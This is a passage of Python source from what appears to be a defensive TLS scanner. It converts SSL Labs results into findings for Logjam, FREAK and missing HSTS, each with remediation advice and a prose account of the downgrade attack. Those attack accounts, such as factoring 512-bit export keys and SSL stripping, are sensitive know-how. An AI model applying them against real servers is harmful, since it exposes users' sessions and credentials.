                "recommendation": "Disable DHE_EXPORT cipher suites. Generate a unique 2048-bit or 4096-bit DH group. Prefer ECDHE key exchange (X25519 or P-256).",
                "detail": "Server supports export-grade Diffie-Hellman — susceptible to Logjam downgrade.",
                "burp": BURP_LOGJAM,
            })

        # ── FREAK ─────────────────────────────────────────────────────────
        if details.get("freak"):
            findings.append({
                "id": "ssl_labs_freak",
                "name": "FREAK — Export RSA Keys Supported",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Force your server into 512-bit RSA_EXPORT key exchange by stripping all "
                    "strong cipher suites from the ClientHello. A 512-bit RSA key can be factored "
                    "in ~7 hours on Amazon EC2 (~$100). Once factored, the attacker decrypts "
                    "all captured HTTPS traffic — exposing every user's session tokens and credentials."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable all RSA_EXPORT cipher suites on your server. Enable only ECDHE and DHE key exchange with 2048-bit+ parameters.",
                "detail": "Server accepts RSA_EXPORT cipher suites — FREAK downgrade attack possible.",
                "burp": BURP_FREAK,
            })

        # ── HSTS (from SSL Labs — works even through Cloudflare) ──────────
        hsts_policy = details.get("hstsPolicy", {})
        hsts_status = hsts_policy.get("status", "absent")
        if hsts_status == "absent":
            findings.append({
                "id": "ssl_labs_hsts",
                "name": "HSTS Not Configured (Confirmed via TLS Layer)",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Perform an SSL strip / downgrade attack on first-time visitors. Without HSTS, "
                    "the browser has no memory of HTTPS being required — so an attacker on the same "
                    "network intercepts the initial HTTP request, strips the redirect to HTTPS, and "
                    "reads the session in plain text through Burp Proxy. Credentials entered on "
                    "the first visit are fully exposed."
                ),
                "attacker_cannot": None,
                "recommendation": "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. Submit to the HSTS preload list at hstspreload.org.",
                "detail": "No HSTS policy detected at TLS level — confirmed by SSL Labs deep scan.",
                "burp": BURP_NO_HSTS_SSL,
            })
        else:
            max_age = hsts_policy.get("maxAge", 0)
            findings.append({
                "id": "ssl_labs_hsts",
                "name": "HSTS Policy Active (TLS Verified)",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "info",
                "status": "protected",
                "matched_at": hostname,
                "attacker_can": None,
                "attacker_cannot": "Strip HTTPS and force users onto plain HTTP — the browser remembers HSTS and refuses the downgrade.",
                "recommendation": None,
                "detail": f"HSTS confirmed by SSL Labs. max-age={max_age}s.",
                "burp": None,
            })

    except Exception:
        # SSL Labs unavailable or rate-limited — no findings, not an error
        pass

    return findings
